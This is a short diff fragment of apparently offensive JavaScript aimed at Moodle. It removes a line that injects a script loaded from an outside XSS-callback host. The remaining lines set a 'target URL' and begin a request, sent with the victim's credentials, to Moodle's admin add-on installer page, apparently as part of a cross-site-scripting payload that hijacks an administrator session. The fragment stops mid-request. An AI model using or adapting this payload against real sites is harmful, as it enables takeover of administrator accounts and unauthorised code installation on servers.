@@ -1,6 +1,3 @@
-var a=document.createElement(\'script\');
-a.src=\'https://buemoodle.xss.ht\';
-document.body.appendChild(a);
 const URL = "https://daviddoaa.me/moodle/"; // Change this to your target URL 
   fetch(URL + "admin/tool/installaddon/index.php", {
     credentials: "include",
